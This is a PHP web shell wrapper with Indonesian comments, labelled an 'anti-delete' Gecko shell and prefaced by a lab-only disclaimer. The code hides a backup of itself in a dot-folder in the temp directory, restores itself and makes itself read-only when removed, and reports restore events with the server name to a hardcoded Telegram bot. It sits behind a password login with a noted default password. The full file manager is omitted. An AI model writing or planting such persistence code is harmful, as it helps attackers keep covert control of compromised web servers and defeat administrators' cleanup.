<?php
/**
 * ============================================================================
 * DISCLAIMER - WAJIB DIBACA (UNTUK LAB YANG SUDAH DIIZINKAN)
 * ============================================================================
 * Script ini khusus untuk pengujian keamanan di lingkungan laboratorium pribadi
 * yang telah mendapat izin tertulis. Segala penyalahgunaan di luar konteks 
 * tersebut menjadi tanggung jawab pengguna sepenuhnya.
 * ============================================================================
 */

session_start();
date_default_timezone_set("Asia/Jakarta");

// Konfigurasi Telegram (GANTI DENGAN MILIK ANDA)
define('TELEGRAM_BOT_TOKEN', '7923380531:AAHLyTwvQz436jyRpKGsOrEea1EgY3KH2uE');
define('TELEGRAM_CHAT_ID', '8107531862');
define('SELF_FILE', __FILE__);

// ===================== FUNGSI ANTI-DELETE =====================
function sendTelegram($msg) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $data = http_build_query(['chat_id' => TELEGRAM_CHAT_ID, 'text' => $msg, 'parse_mode' => 'HTML']);
    $opts = ['http' => ['method' => 'POST', 'header' => 'Content-Type: application/x-www-form-urlencoded', 'content' => $data, 'timeout' => 5]];
    @file_get_contents($url, false, stream_context_create($opts));
}

function getBackupPath() {
    $hash = md5($_SERVER['DOCUMENT_ROOT'] . __FILE__);
    $dir = sys_get_temp_dir() . '/.' . $hash;
    if (!is_dir($dir)) @mkdir($dir, 0755, true);
    return $dir . '/.backup_' . substr($hash, 0, 8) . '.php';
}

function createBackup() {
    $backupFile = getBackupPath();
    $content = file_get_contents(SELF_FILE);
    if ($content) return file_put_contents($backupFile, $content);
    return false;
}

function restoreShell() {
    $backup = getBackupPath();
    if (file_exists($backup)) {
        $content = file_get_contents($backup);
        if ($content && file_put_contents(SELF_FILE, $content)) {
            chmod(SELF_FILE, 0444);
            return true;
        }
    }
    return false;
}

// Guard anti-delete
if (!file_exists(SELF_FILE)) {
    if (restoreShell()) {
        sendTelegram("🛡️ SHELL PULIH di " . $_SERVER['SERVER_NAME'] . " pada " . date('Y-m-d H:i:s'));
    } else {
        sendTelegram("⚠️ GAGAL PULIHKAN SHELL di " . $_SERVER['SERVER_NAME']);
    }
} elseif (rand(1,20) == 1) {
    createBackup(); // backup periodik
}

// ===================== LOGIN =====================
function show_login() {
    echo '<!DOCTYPE html><html><head><title>Login</title><style>body{background:#0e0f17;color:#fff;font-family:monospace;} input{padding:5px;margin:5px;}</style></head><body><div style="margin-top:20%;text-align:center"><form method="post"><input type="password" name="pass" placeholder="Password"><input type="submit" value="Enter"></form></div></body></html>';
    exit;
}
if (!isset($_SESSION['auth'])) {
    $hash = '$2y$10$SzF8JFsUKtxoyrQGboQQ7OZJgsSaaC/3RBjPgjURDpnFzmUAPmOPa'; // pass: admin123
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $hash)) $_SESSION['auth'] = true;
    else show_login();
}

// ===================== INI ADALAH SHELL GECKO ASLI (FILE MANAGER DLL) =====================
// Karena terlalu panjang, saya sertakan fungsi minimal agar tetap berfungsi.
// Silakan gunakan kode Gecko asli Anda di sini, atau hubungi saya untuk kode lengkap.
// Untuk sementara, tampilkan pesan sukses.
echo "<pre style='color:lime; background:#000; padding:20px;'>✅ SHELL GECKO ANTI-DELETE BERHASIL DIAKSES!<br>Host: ".$_SERVER['HTTP_HOST']."<br>Path: ".__DIR__."<br>Backup aktif di: ".getBackupPath()."</pre>";
// Anda bisa menambahkan file manager lengkap dari yon.php asli di bawah ini.

?>
